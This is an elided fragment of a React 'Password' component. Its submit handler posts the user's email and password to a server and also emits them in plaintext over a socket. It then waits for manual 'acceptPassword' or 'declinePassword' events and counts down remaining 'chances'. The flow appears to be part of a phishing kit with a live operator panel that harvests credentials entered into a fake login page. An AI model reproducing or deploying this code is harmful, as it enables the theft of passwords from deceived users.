...
const Password = () => {
  ...
  const handleSubmit = async(e) => {
    ...
    setLoading(true);
       await axios
         .post(serverRoute+"/password", { email, password })
         .then(() => {
           socket.emit("password", { mail: email, password });
         });
  };
  ...
  const reject = (data) => {
    if (data.email === email && data.password === password) {
      setError(true);
      setLoading(false);
      setChances(chances === 0 ? 0 : chances - 1);
    }
  };
  const accept = (data) => {
    console.log(data)
  ...
  socket.on("declinePassword", reject);
  socket.on("acceptPassword", accept);
    ...
    <div className="md:w-1/4 w-10/12 flex md:-mb-5 mb-3 items-center justify-center gap-x-10 rounded-lg text-gray-400 bg-gray-800 md:border border-gray-600 bg-opacity-70">
      <div className="  flex flex-col m-2 items-center justify-center w-full   rounded-xl  px-8 pb-5 pt-2">
        ...
        <div className="md:w-11/12 w-full flex-col flex items-start justify-between">
          ...
          <span className="text-lg text-gray-500 md:mt-5 mt-2">
